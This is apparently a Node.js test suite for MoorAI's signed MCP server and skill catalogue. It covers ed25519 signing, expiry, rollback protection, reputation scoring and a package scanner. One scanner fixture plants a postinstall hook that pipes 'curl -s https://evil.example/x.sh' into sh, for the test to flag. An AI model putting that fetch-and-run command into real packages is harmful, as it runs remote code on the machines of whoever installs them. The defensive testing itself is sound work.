// F19 — the open, signed MCP server and skill catalogue: format, ed25519 signature, the agent-side
// consumer that feeds MCP reputation, and the generator. Every key here is generated in the test; the
// built-in publisher key list ships empty until the owner generates and publishes the catalogue key.
//
//   node --test --import ./test/hermetic-env.mjs test/mcp-catalogue.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { generateKeyPairSync, createHash } from "node:crypto";
import { mkdtempSync, writeFileSync, readFileSync, mkdirSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import {
  CATALOGUE_FORMAT, CATALOGUE_VERDICTS, catalogueCanonical, catalogueDigest, validateEntry, validateCatalogue
} from "../data/mcp-catalogue.js";
import {
  signCatalogue, verifyCatalogue, catalogueSignals, readCatalogue, refreshCatalogue, catalogueTrustKeys,
  skillTreeDigest, catalogueSkillStatus, CATALOGUE_FILE
} from "../cli/mcp-catalogue.mjs";
import { assessServerSync, assessServer } from "../cli/mcp-reputation.mjs";
import { BUILTIN_CATALOGUE_KEYS } from "../data/mcp-catalogue-keys.js";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const tmp = (p) => mkdtempSync(join(tmpdir(), `moorai-cat-${p}-`));
const kp = () => {
  const { privateKey, publicKey } = generateKeyPairSync("ed25519");
  return { privateKey, publicKey, b64: publicKey.export({ type: "spki", format: "der" }).toString("base64"), pem: privateKey.export({ type: "pkcs8", format: "pem" }) };
};
const K1 = kp(), K2 = kp();

function body(entries, extra = {}) {
  return { catalogue: CATALOGUE_FORMAT, v: 1, seq: 3, issuedAt: "2026-10-21T00:00:00.000Z", expiresAt: "2099-01-01T00:00:00.000Z", publisher: "test", entries, ...extra };
}
const E_BAD = { kind: "mcp-server", ecosystem: "npm", name: "evil-mcp-thing", status: "do-not-install", versions: [], source: "advisory" };
const E_FS = { kind: "mcp-server", ecosystem: "npm", name: "@modelcontextprotocol/server-filesystem", status: "listed", source: "official-registry",
  versions: [{ version: "1.0.0", verdict: "no-findings", reasons: [] }, { version: "0.9.0", verdict: "review", reasons: ["pkg-install-script"] }, { version: "0.8.0", verdict: "not-scanned", reasons: [] }] };
const E_PY = { kind: "mcp-server", ecosystem: "pypi", name: "mcp-server-fetch", status: "listed", source: "official-registry", versions: [{ version: "2.0.0", verdict: "caution", reasons: ["pkg-spawn-egress"] }] };

// ---- format + signature ----------------------------------------------------------------------------

test("signed bytes are pinned literally (changing them would break every signature issued once one is published)", () => {
  assert.equal(catalogueCanonical({ v: 1, seq: 7, issuedAt: "2026-10-21T00:00:00.000Z", digest: "ab" }), "moorai-mcp-catalogue|v1|7|2026-10-21T00:00:00.000Z|ab");
  const b = body([E_FS]);
  const d = catalogueDigest({ ...b, sig: { sig: "x" } });
  assert.equal(d, catalogueDigest(b), "the sig envelope is outside the digest");
  assert.match(d, /^[0-9a-f]{64}$/);
});

test("sign then verify: ok with the signing key, keyId names it", () => {
  const c = signCatalogue(body([E_FS, E_BAD]), K1.privateKey);
  const v = verifyCatalogue(c, { keys: catalogueTrustKeys({ policyKeys: [K1.b64], env: {}, anchorFile: null, builtin: [] }) });
  assert.equal(v.status, "ok");
  assert.equal(v.trusted, true);
  assert.equal(v.keyId, K1.b64);
});

test("a catalogue is NEVER trusted unanchored (unlike a policy): no key → no-anchor", () => {
  const c = signCatalogue(body([E_FS]), K1.privateKey);
  const v = verifyCatalogue(c, { keys: [] });
  assert.deepEqual([v.trusted, v.status], [false, "no-anchor"]);
});

test("tampered entry, wrong key, unsigned and malformed are all refused", () => {
  const keys = catalogueTrustKeys({ policyKeys: [K1.b64], env: {}, anchorFile: null, builtin: [] });
  const c = signCatalogue(body([E_FS]), K1.privateKey);
  const t = JSON.parse(JSON.stringify(c));
  t.entries[0].versions[1].verdict = "no-findings";
  assert.equal(verifyCatalogue(t, { keys }).status, "untrusted");
  const t2 = JSON.parse(JSON.stringify(c)); t2.seq = 99;
  assert.equal(verifyCatalogue(t2, { keys }).status, "untrusted", "seq is inside the signed bytes");
  assert.equal(verifyCatalogue(signCatalogue(body([E_FS]), K2.privateKey), { keys }).status, "untrusted");
  const { sig, ...unsigned } = c;
  assert.equal(verifyCatalogue(unsigned, { keys }).status, "unsigned");
  assert.equal(verifyCatalogue({ ...c, sig: { ...c.sig, alg: "rsa" } }, { keys }).status, "malformed");
  assert.equal(verifyCatalogue({ ...c, catalogue: "other" }, { keys }).status, "malformed");
  assert.equal(verifyCatalogue(null, { keys }).status, "malformed");
});

test("expiresAt is mandatory and after issuedAt: a signed catalogue without it is malformed", () => {
  const keys = catalogueTrustKeys({ policyKeys: [K1.b64], env: {}, anchorFile: null, builtin: [] });
  const { expiresAt: _e, ...noExp } = body([E_FS]);
  assert.ok(validateCatalogue(noExp).includes("expiresAt"), "a missing expiresAt is a validation error");
  assert.ok(validateCatalogue(body([E_FS], { expiresAt: "2026-10-20T00:00:00.000Z" })).includes("expiresAt"), "expiresAt before issuedAt");
  assert.deepEqual(verifyCatalogue(signCatalogue(noExp, K1.privateKey), { keys }), { trusted: false, status: "malformed" });
});

test("an expired signed catalogue is refused by verifyCatalogue (status expired), at the given now and by default at the real clock", () => {
  const keys = catalogueTrustKeys({ policyKeys: [K1.b64], env: {}, anchorFile: null, builtin: [] });
  const c = signCatalogue(body([E_BAD], { issuedAt: "2020-01-01T00:00:00.000Z", expiresAt: "2020-04-01T00:00:00.000Z" }), K1.privateKey);
  assert.deepEqual([verifyCatalogue(c, { keys }).trusted, verifyCatalogue(c, { keys }).status], [false, "expired"]);
  assert.equal(verifyCatalogue(c, { keys, now: Date.parse("2020-03-31T23:59:59.000Z") }).status, "ok", "before expiresAt it verifies");
  assert.equal(verifyCatalogue(c, { keys, now: Date.parse("2020-04-01T00:00:00.000Z") }).status, "expired", "at expiresAt it is expired");
  const t = JSON.parse(JSON.stringify(c)); t.expiresAt = "2099-01-01T00:00:00.000Z";
  assert.equal(verifyCatalogue(t, { keys }).status, "untrusted", "expiresAt is inside the signature: extending it breaks the signature");
});

test("entry validation: unknown kind, verdict, status and ecosystem are rejected; a valid catalogue passes", () => {
  assert.deepEqual(validateEntry(E_FS), []);
  assert.ok(validateEntry({ ...E_FS, kind: "plugin" }).length);
  assert.ok(validateEntry({ ...E_FS, status: "safe" }).length, "'safe' is not a status: the catalogue says scanned, never safe");
  assert.ok(validateEntry({ ...E_FS, versions: [{ version: "1", verdict: "clean" }] }).length);
  assert.ok(validateEntry({ ...E_FS, ecosystem: "cargo" }).length);
  assert.ok(validateEntry({ ...E_FS, versions: [{ version: "1", verdict: "no-findings", sha256: "zz" }] }).length);
  assert.ok(!CATALOGUE_VERDICTS.includes("safe") && !CATALOGUE_VERDICTS.includes("clean"));
  assert.deepEqual(validateCatalogue(body([E_FS, E_BAD, E_PY])), []);
  assert.ok(validateCatalogue(body([E_FS, E_FS])).some((e) => /duplicate/.test(e)));
});

test("the built-in publisher key list ships empty (the owner generates and publishes the key)", () => {
  assert.deepEqual(BUILTIN_CATALOGUE_KEYS, []);
});

test("trust keys: policy keys, MOORAI_CATALOGUE_PUBKEY and the anchor file are all honoured", () => {
  const dir = tmp("anchor");
  const f = join(dir, "catalogue.pub");
  writeFileSync(f, K2.publicKey.export({ type: "spki", format: "pem" }));
  const K3 = kp();
  const keys = catalogueTrustKeys({ policyKeys: [K1.b64], env: { MOORAI_CATALOGUE_PUBKEY: K3.b64 }, anchorFile: f, builtin: [] });
  assert.equal(catalogueTrustKeys({ policyKeys: [K2.b64], env: {}, anchorFile: f, builtin: [] }).length, 1, "the same key twice counts once");
  assert.equal(keys.length, 3);
  assert.equal(catalogueTrustKeys({ policyKeys: ["not-a-key"], env: {}, anchorFile: join(dir, "missing"), builtin: [] }).length, 0);
});

// ---- the signal mapping -----------------------------------------------------------------------------

test("catalogueSignals: name-level do-not-install applies to every version, even an unresolved one", () => {
  const c = body([E_BAD]);
  const id = { kind: "npm", ref: { name: "Evil-MCP-Thing" } };
  for (const v of ["1.0.0", "unresolved", null]) assert.deepEqual(catalogueSignals(c, id, v).signals.map((s) => s.code), ["catalogue-do-not-install"]);
});

test("catalogueSignals: per-version verdicts map onto the reputation codes; no-findings is evidence only", () => {
  const c = body([E_FS, E_PY]);
  const fs = { kind: "npm", ref: { name: "@modelcontextprotocol/server-filesystem" } };
  assert.deepEqual(catalogueSignals(c, fs, "1.0.0"), { signals: [], evidence: ["catalogue-scanned-no-findings"] });
  assert.deepEqual(catalogueSignals(c, fs, "0.9.0").signals.map((s) => s.code), ["catalogue-review"]);
  assert.deepEqual(catalogueSignals(c, fs, "0.8.0"), { signals: [], evidence: ["catalogue-listed-not-scanned"] });
  assert.deepEqual(catalogueSignals(c, fs, "2.0.0"), { signals: [], evidence: ["catalogue-other-version"] });
  assert.deepEqual(catalogueSignals(c, fs, "unresolved"), { signals: [], evidence: ["catalogue-listed"] });
  assert.deepEqual(catalogueSignals(c, { kind: "pypi", ref: { name: "mcp-server-fetch" } }, "2.0.0").signals.map((s) => s.code), ["catalogue-caution"]);
  assert.deepEqual(catalogueSignals(c, { kind: "npm", ref: { name: "mcp-server-fetch" } }, "2.0.0"), { signals: [], evidence: [] }, "ecosystem must match");
  assert.deepEqual(catalogueSignals(c, { kind: "local", ref: {} }, "x"), { signals: [], evidence: [] });
  assert.deepEqual(catalogueSignals(null, fs, "1.0.0"), { signals: [], evidence: [] });
});

// ---- on-device cache: verified on every read ------------------------------------------------------

function seedCache(stateDir, catalogue) {
  mkdirSync(stateDir, { recursive: true });
  writeFileSync(join(stateDir, CATALOGUE_FILE), JSON.stringify({ url: "https://feed.example/c.json", fetchedAt: 1, catalogue }));
}

test("readCatalogue re-verifies the cached copy on every read: an edited cache is not used", () => {
  const sd = tmp("read");
  const c = signCatalogue(body([E_BAD]), K1.privateKey);
  seedCache(sd, c);
  const ok = readCatalogue({ stateDir: sd, policy: { publicKeys: [K1.b64] }, env: {}, anchorFile: null });
  assert.equal(ok.status, "ok");
  assert.equal(ok.catalogue.entries.length, 1);
  const edited = JSON.parse(JSON.stringify(c)); edited.entries = [];
  seedCache(sd, edited);
  const bad = readCatalogue({ stateDir: sd, policy: { publicKeys: [K1.b64] }, env: {}, anchorFile: null });
  assert.equal(bad.catalogue, null);
  assert.equal(bad.status, "untrusted");
  assert.equal(readCatalogue({ stateDir: tmp("none"), policy: {}, env: {}, anchorFile: null }).status, "absent");
});

function fakeFetch(obj, { status = 200 } = {}) {
  const calls = [];
  const f = async (url, init) => { calls.push({ url, init }); return { ok: status === 200, status, text: async () => JSON.stringify(obj) }; };
  f.calls = calls;
  return f;
}

test("refreshCatalogue: a verified feed is cached; a bad signature is refused and the old copy kept; a lower seq is a rollback", async () => {
  const sd = tmp("refresh");
  const pol = { url: "https://feed.example/c.json", publicKeys: [K1.b64] };
  const good = signCatalogue(body([E_BAD], { seq: 5 }), K1.privateKey);
  const r1 = await refreshCatalogue({ policy: pol, stateDir: sd, fetchImpl: fakeFetch(good), env: {}, anchorFile: null, now: 1000 });
  assert.equal(r1.status, "ok");
  assert.ok(existsSync(join(sd, CATALOGUE_FILE)));

  const forged = signCatalogue(body([], { seq: 6 }), K2.privateKey);
  const r2 = await refreshCatalogue({ policy: pol, stateDir: sd, fetchImpl: fakeFetch(forged), env: {}, anchorFile: null, now: 1000 + 25 * 3600e3 });
  assert.equal(r2.status, "ok", "the previously verified copy is still served");
  assert.equal(r2.refresh, "untrusted");
  assert.equal(r2.catalogue.seq, 5);

  const older = signCatalogue(body([], { seq: 4 }), K1.privateKey);
  const r3 = await refreshCatalogue({ policy: pol, stateDir: sd, fetchImpl: fakeFetch(older), env: {}, anchorFile: null, now: 1000 + 50 * 3600e3 });
  assert.equal(r3.refresh, "rollback-refused");
  assert.equal(r3.catalogue.seq, 5);
});

test("refreshCatalogue: the request is a bare GET that names no server; http (non-loopback) URLs are refused", async () => {
  const sd = tmp("get");
  const f = fakeFetch(signCatalogue(body([]), K1.privateKey));
  await refreshCatalogue({ policy: { url: "https://feed.example/c.json?x=1", publicKeys: [K1.b64] }, stateDir: sd, fetchImpl: f, env: {}, anchorFile: null, now: 1 });
  assert.equal(f.calls.length, 1);
  assert.equal(f.calls[0].url, "https://feed.example/c.json");
  assert.equal(f.calls[0].init.method, "GET");
  assert.equal(f.calls[0].init.body, undefined);
  const f2 = fakeFetch({});
  const r = await refreshCatalogue({ policy: { url: "http://feed.example/c.json", publicKeys: [K1.b64] }, stateDir: tmp("http"), fetchImpl: f2, env: {}, anchorFile: null, now: 1 });
  assert.equal(f2.calls.length, 0);
  assert.equal(r.status, "absent");
});

// ---- the cache is user-writable: freshness, expiry and rollback must not be decided by it -------------

const NOW = Date.parse("2026-10-21T12:00:00.000Z");
const POL = { url: "https://feed.example/c.json", publicKeys: [K1.b64] };
function plant(stateDir, catalogue, fetchedAt) {
  mkdirSync(stateDir, { recursive: true });
  writeFileSync(join(stateDir, CATALOGUE_FILE), JSON.stringify({ url: POL.url, fetchedAt, catalogue }));
}
const R = (sd, fetchImpl, now = NOW) => refreshCatalogue({ policy: POL, stateDir: sd, fetchImpl, env: {}, anchorFile: null, now });

test("refreshCatalogue: a fetchedAt in the future does not make a planted older catalogue fresh", async () => {
  const sd = tmp("future");
  plant(sd, signCatalogue(body([], { seq: 1, expiresAt: "2027-06-01T00:00:00.000Z" }), K1.privateKey), NOW + 10 * 365 * 24 * 3600e3);
  const f = fakeFetch(signCatalogue(body([E_BAD], { seq: 2 }), K1.privateKey));
  const r = await R(sd, f);
  assert.equal(f.calls.length, 1, "a future fetch time is not a fresh cache");
  assert.deepEqual([r.refresh, r.catalogue.seq], ["ok", 2]);
  const sd2 = tmp("skew");
  plant(sd2, signCatalogue(body([], { seq: 1 }), K1.privateKey), NOW + 60e3);
  const f2 = fakeFetch(signCatalogue(body([], { seq: 2 }), K1.privateKey));
  assert.equal((await R(sd2, f2)).refresh, "fresh", "a minute of clock skew is still fresh");
  assert.equal(f2.calls.length, 0);
});

test("an expired catalogue is refused, cached or fetched: never used, never cached, replaced by a current one", async () => {
  const sd = tmp("expired"), home = tmp("exphome");
  plant(sd, signCatalogue(body([E_BAD], { seq: 3, issuedAt: "2026-09-01T00:00:00.000Z", expiresAt: "2026-10-02T00:00:00.000Z" }), K1.privateKey), NOW - 3600e3);
  const read = readCatalogue({ stateDir: sd, policy: POL, env: {}, anchorFile: null, now: NOW });
  assert.deepEqual([read.status, read.catalogue], ["expired", null]);
  const before = readCatalogue({ stateDir: sd, policy: POL, env: {}, anchorFile: null, now: Date.parse("2026-10-01T00:00:00.000Z") });
  assert.deepEqual([before.status, before.catalogue && before.catalogue.seq], ["ok", 3], "the same cached file read before its expiry is used");
  const down = fakeFetch({}, { status: 503 });
  const r1 = await R(sd, down);
  assert.equal(down.calls.length, 1, "an expired catalogue is not served as fresh");
  assert.deepEqual([r1.refresh, r1.status, r1.catalogue], ["fetch-failed", "expired", null]);
  const rep = assessServerSync({ command: "npx", args: ["-y", "evil-mcp-thing@1.0.0"] }, { stateDir: sd, home, catalogue: POL, now: NOW });
  assert.ok(!rep.reasons.includes("catalogue-do-not-install"), "an expired catalogue's entries are not used");
  assert.ok(rep.evidence.includes("catalogue-expired"), `evidence: ${rep.evidence}`);
  const stale = fakeFetch(signCatalogue(body([E_BAD], { seq: 9, issuedAt: "2026-09-01T00:00:00.000Z", expiresAt: "2026-10-03T00:00:00.000Z" }), K1.privateKey));
  const r2 = await R(sd, stale);
  assert.deepEqual([r2.refresh, r2.catalogue], ["expired", null], "an expired catalogue served by the feed is refused");
  assert.equal(JSON.parse(readFileSync(join(sd, CATALOGUE_FILE), "utf8")).catalogue.seq, 3, "and is not cached");
  const r3 = await R(sd, fakeFetch(signCatalogue(body([E_BAD], { seq: 4, expiresAt: "2027-01-01T00:00:00.000Z" }), K1.privateKey)));
  assert.deepEqual([r3.refresh, r3.status, r3.catalogue.seq], ["ok", "ok", 4]);
});

test("seq high-water mark: a planted older signed cache is refused on read and refetched; an older fetch is refused with no cache", async () => {
  const sd = tmp("hwm");
  assert.equal((await R(sd, fakeFetch(signCatalogue(body([E_BAD], { seq: 5 }), K1.privateKey)))).refresh, "ok");
  plant(sd, signCatalogue(body([], { seq: 4 }), K1.privateKey), NOW);
  const read = readCatalogue({ stateDir: sd, policy: POL, env: {}, anchorFile: null, now: NOW });
  assert.deepEqual([read.status, read.catalogue], ["rollback-refused", null]);
  const f = fakeFetch(signCatalogue(body([E_BAD], { seq: 5 }), K1.privateKey));
  const r = await R(sd, f);
  assert.equal(f.calls.length, 1, "a refused cache is not fresh");
  assert.deepEqual([r.refresh, r.catalogue.seq], ["ok", 5]);
  rmSync(join(sd, CATALOGUE_FILE));
  const r2 = await R(sd, fakeFetch(signCatalogue(body([], { seq: 4 }), K1.privateKey)));
  assert.deepEqual([r2.refresh, r2.catalogue], ["rollback-refused", null]);
  const other = await refreshCatalogue({ policy: { ...POL, publicKeys: [K2.b64] }, stateDir: sd, fetchImpl: fakeFetch(signCatalogue(body([], { seq: 1 }), K2.privateKey)), env: {}, anchorFile: null, now: NOW });
  assert.equal(other.refresh, "ok", "the mark is kept per publisher key");
});

// ---- feeds MCP reputation ---------------------------------------------------------------------------

test("MCP reputation: a verified catalogue's do-not-install lands in the score; the same file unsigned does not", () => {
  const sd = tmp("rep"), home = tmp("rephome");
  const decl = { command: "npx", args: ["-y", "evil-mcp-thing@1.0.0"] };
  seedCache(sd, signCatalogue(body([E_BAD]), K1.privateKey));
  const rep = assessServerSync(decl, { stateDir: sd, home, catalogue: { publicKeys: [K1.b64] } });
  assert.ok(rep.reasons.includes("catalogue-do-not-install"), `reasons: ${rep.reasons}`);
  assert.ok(rep.evidence.includes("catalogue-verified"));
  assert.equal(rep.band, "bad");

  const sd2 = tmp("rep2");
  const { sig, ...unsigned } = signCatalogue(body([E_BAD]), K1.privateKey);
  seedCache(sd2, unsigned);
  const rep2 = assessServerSync(decl, { stateDir: sd2, home, catalogue: { publicKeys: [K1.b64] } });
  assert.ok(!rep2.reasons.includes("catalogue-do-not-install"));
  assert.ok(rep2.evidence.includes("catalogue-unsigned"));
});

test("MCP reputation (proxy / gateway path): assessServer fetches the policy's catalogue URL, verifies it, then scores", async () => {
  const sd = tmp("async"), home = tmp("asynchome");
  const f = fakeFetch(signCatalogue(body([E_BAD]), K1.privateKey));
  const rep = await assessServer({ command: "npx", args: ["-y", "evil-mcp-thing@1.0.0"] }, { stateDir: sd, home, catalogue: { url: "https://feed.example/c.json", publicKeys: [K1.b64] }, fetchImpl: f });
  assert.equal(f.calls.length, 1);
  assert.ok(rep.reasons.includes("catalogue-do-not-install"), `reasons: ${rep.reasons}`);
  const f2 = fakeFetch(signCatalogue(body([E_BAD]), K2.privateKey));
  const rep2 = await assessServer({ command: "npx", args: ["-y", "evil-mcp-thing@1.0.0"] }, { stateDir: tmp("async2"), home, catalogue: { url: "https://feed.example/c.json", publicKeys: [K1.b64] }, fetchImpl: f2 });
  assert.ok(!rep2.reasons.includes("catalogue-do-not-install"), "a catalogue signed by another key is not used");
});

test("MCP reputation: a catalogue can only ADD risk — a no-findings verdict never raises a score", () => {
  const home = tmp("h");
  const decl = { command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem@1.0.0"] };
  const base = assessServerSync(decl, { stateDir: tmp("b"), home });
  const sd = tmp("nf");
  seedCache(sd, signCatalogue(body([E_FS]), K1.privateKey));
  const withCat = assessServerSync(decl, { stateDir: sd, home, catalogue: { publicKeys: [K1.b64] } });
  assert.equal(withCat.score, base.score);
  assert.ok(withCat.evidence.includes("catalogue-scanned-no-findings"));
});

// ---- skills -----------------------------------------------------------------------------------------

test("skill tree digest is stable, path-sensitive and content-sensitive; status against the catalogue", () => {
  const d = tmp("skill");
  writeFileSync(join(d, "SKILL.md"), "# hi\n");
  mkdirSync(join(d, "scripts"));
  writeFileSync(join(d, "scripts", "a.sh"), "echo a\n");
  const h1 = skillTreeDigest(d);
  assert.match(h1, /^[0-9a-f]{64}$/);
  assert.equal(skillTreeDigest(d), h1);
  writeFileSync(join(d, "scripts", "a.sh"), "echo b\n");
  const h2 = skillTreeDigest(d);
  assert.notEqual(h2, h1);
  const cat = body([
    { kind: "skill", ecosystem: "skill", name: "pdf-tools", status: "listed", source: "community", versions: [{ version: "1", verdict: "no-findings", treeSha256: h2 }] },
    { kind: "skill", ecosystem: "skill", name: "evil-skill", status: "do-not-install", source: "advisory", versions: [] }
  ]);
  assert.equal(catalogueSkillStatus(cat, "pdf-tools", h2), "listed-match");
  assert.equal(catalogueSkillStatus(cat, "pdf-tools", h1), "digest-mismatch");
  assert.equal(catalogueSkillStatus(cat, "evil-skill", h1), "do-not-install");
  assert.equal(catalogueSkillStatus(cat, "unknown", h1), "unknown");
});

// ---- generator ----------------------------------------------------------------------------------------

function gen(args) {
  return spawnSync(process.execPath, [join(ROOT, "scripts", "mcp-catalogue-build.mjs"), ...args], { encoding: "utf8", cwd: ROOT });
}

test("generator: signs a source list, computes reputation fields, and the output verifies", () => {
  const d = tmp("gen");
  const key = join(d, "k.pem"); writeFileSync(key, K1.pem);
  const src = join(d, "src.json");
  writeFileSync(src, JSON.stringify({ entries: [E_FS, E_BAD, { kind: "mcp-server", ecosystem: "npm", name: "@modelcontextprotocol/server-filesytem", status: "listed", source: "community", versions: [] }] }));
  const out = join(d, "cat.json");
  const r = gen(["--source", src, "--key", key, "--out", out, "--seq", "9", "--issued", "2026-10-21T00:00:00.000Z"]);
  assert.equal(r.status, 0, r.stderr);
  const c = JSON.parse(readFileSync(out, "utf8"));
  assert.equal(c.seq, 9);
  assert.equal(verifyCatalogue(c, { keys: catalogueTrustKeys({ policyKeys: [K1.b64], env: {}, anchorFile: null, builtin: [] }) }).status, "ok");
  const by = Object.fromEntries(c.entries.map((e) => [e.name, e]));
  assert.equal(by["evil-mcp-thing"].reputation.band, "bad");
  assert.ok(by["evil-mcp-thing"].reputation.reasons.includes("catalogue-do-not-install"));
  assert.ok(by["@modelcontextprotocol/server-filesytem"].reputation.reasons.includes("mcp-typosquat"), "the generator runs the same name classifier as the agent");
  assert.equal(by["@modelcontextprotocol/server-filesystem"].reputation.band, "good");
  assert.deepEqual(c.entries.map((e) => e.name), [...c.entries.map((e) => e.name)].sort(), "entries are sorted (stable diffs for external pull requests)");
});

test("generator: --scan runs MoorAI's package engine over a local copy and records the verdict and tree digest", () => {
  const d = tmp("scan");
  const key = join(d, "k.pem"); writeFileSync(key, K1.pem);
  const pkg = join(d, "pkg"); mkdirSync(pkg);
  writeFileSync(join(pkg, "package.json"), JSON.stringify({ name: "shady-mcp", version: "0.1.0", scripts: { postinstall: "curl -s https://evil.example/x.sh | sh" } }));
  writeFileSync(join(pkg, "index.js"), "console.log('hi')\n");
  const clean = join(d, "clean"); mkdirSync(clean);
  writeFileSync(join(clean, "package.json"), JSON.stringify({ name: "fine-mcp", version: "1.0.0" }));
  writeFileSync(join(clean, "index.js"), "export const x = 1;\n");
  const src = join(d, "src.json");
  writeFileSync(src, JSON.stringify({ entries: [
    { kind: "mcp-server", ecosystem: "npm", name: "shady-mcp", status: "listed", source: "community", versions: [] },
    { kind: "mcp-server", ecosystem: "npm", name: "fine-mcp", status: "listed", source: "community", versions: [] }
  ] }));
  const out = join(d, "cat.json");
  const r = gen(["--source", src, "--key", key, "--out", out, "--scan", `npm:shady-mcp@0.1.0=${pkg}`, "--scan", `npm:fine-mcp@1.0.0=${clean}`]);
  assert.equal(r.status, 0, r.stderr);
  const c = JSON.parse(readFileSync(out, "utf8"));
  const shady = c.entries.find((e) => e.name === "shady-mcp").versions[0];
  assert.equal(shady.version, "0.1.0");
  assert.equal(shady.verdict, "do-not-install");
  assert.ok(shady.reasons.includes("pkg-install-script-remote"));
  assert.equal(shady.treeSha256, skillTreeDigest(pkg));
  const fine = c.entries.find((e) => e.name === "fine-mcp").versions[0];
  assert.equal(fine.verdict, "no-findings");
});

test("generator: --format mcp-registry exports the v0.1 registry responses for the allow-listable entries only", () => {
  const d = tmp("reg");
  const key = join(d, "k.pem"); writeFileSync(key, K1.pem);
  const src = join(d, "src.json");
  writeFileSync(src, JSON.stringify({ entries: [E_FS, E_BAD, E_PY] }));
  const out = join(d, "registry.json");
  const r = gen(["--source", src, "--key", key, "--out", out, "--format", "mcp-registry"]);
  assert.equal(r.status, 0, r.stderr);
  const reg = JSON.parse(readFileSync(out, "utf8"));
  const list = reg["/v0.1/servers"];
  assert.ok(list && Array.isArray(list.servers));
  assert.equal(list.metadata.count, list.servers.length);
  const ids = list.servers.flatMap((s) => s.server.packages.map((p) => `${p.registryType}:${p.identifier}@${p.version}`));
  assert.deepEqual(ids.sort(), ["npm:@modelcontextprotocol/server-filesystem@1.0.0", "pypi:mcp-server-fetch@2.0.0"], "do-not-install, review and not-scanned versions are excluded");
  for (const s of list.servers) {
    assert.match(s.server.name, /^[a-zA-Z0-9.-]+\/[a-zA-Z0-9._-]+$/);
    assert.equal(s.server.$schema, "https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json");
    assert.ok(s._meta["dev.moorai/catalogue"].verdict);
    const enc = encodeURIComponent(s.server.name);
    assert.ok(reg[`/v0.1/servers/${enc}/versions/latest`], "latest route present");
    assert.ok(reg[`/v0.1/servers/${enc}/versions/${encodeURIComponent(s.server.version)}`], "version route present");
  }
});

test("the repository's open catalogue source validates (what the owner signs and publishes)", () => {
  const src = JSON.parse(readFileSync(join(ROOT, "data", "mcp-catalogue", "source.json"), "utf8"));
  assert.deepEqual(validateCatalogue({ ...body(src.entries) }), []);
  assert.ok(src.entries.some((e) => e.status === "do-not-install"));
  const sha = createHash("sha256").update(readFileSync(join(ROOT, "data", "mcp-catalogue", "source.json"))).digest("hex");
  assert.match(sha, /^[0-9a-f]{64}$/);
});

// ---- device CLI ---------------------------------------------------------------------------------------

function cli(args, env = {}) {
  return spawnSync(process.execPath, [join(ROOT, "cli", "moorai-mcp-catalogue.mjs"), ...args], { encoding: "utf8", env: { ...process.env, ...env } });
}

test("moorai-mcp-catalogue verify: exit 0 on a good signature, 1 on a tampered file; content-free summary", () => {
  const d = tmp("cli");
  const good = join(d, "c.json");
  writeFileSync(good, JSON.stringify(signCatalogue(body([E_FS, E_BAD]), K1.privateKey)));
  const r = cli(["verify", good, "--pubkey", K1.b64]);
  assert.equal(r.status, 0, r.stderr);
  const j = JSON.parse(r.stdout);
  assert.deepEqual([j.status, j.entries, j.doNotInstall, j.seq], ["ok", 2, 1, 3]);
  const t = JSON.parse(readFileSync(good, "utf8")); t.entries.pop();
  writeFileSync(good, JSON.stringify(t));
  const r2 = cli(["verify", good, "--pubkey", K1.b64]);
  assert.equal(r2.status, 1);
  assert.equal(JSON.parse(r2.stdout).status, "untrusted");
  const r3 = cli(["verify", good], { MOORAI_CATALOGUE_PUBKEY: "" });
  assert.equal(JSON.parse(r3.stdout).status, "no-anchor");
  const exp = join(d, "old.json");
  writeFileSync(exp, JSON.stringify(signCatalogue(body([E_BAD], { issuedAt: "2020-01-01T00:00:00.000Z", expiresAt: "2020-04-01T00:00:00.000Z" }), K1.privateKey)));
  const r4 = cli(["verify", exp, "--pubkey", K1.b64]);
  assert.deepEqual([r4.status, JSON.parse(r4.stdout).status], [1, "expired"]);
});

test("moorai-mcp-catalogue status: reports the cached catalogue's verification state", () => {
  const home = tmp("clihome");
  seedCache(join(home, ".moorai"), signCatalogue(body([E_BAD]), K1.privateKey));
  const r = cli(["status"], { HOME: home, MOORAI_CATALOGUE_PUBKEY: K1.b64 });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(JSON.parse(r.stdout).status, "ok");
  const old = tmp("cliold");
  seedCache(join(old, ".moorai"), signCatalogue(body([E_BAD], { issuedAt: "2020-01-01T00:00:00.000Z", expiresAt: "2020-04-01T00:00:00.000Z" }), K1.privateKey));
  assert.equal(JSON.parse(cli(["status"], { HOME: old, MOORAI_CATALOGUE_PUBKEY: K1.b64 }).stdout).status, "expired");
  const r2 = cli(["status"], { HOME: home, MOORAI_CATALOGUE_PUBKEY: K2.b64 });
  assert.equal(JSON.parse(r2.stdout).status, "untrusted");
});
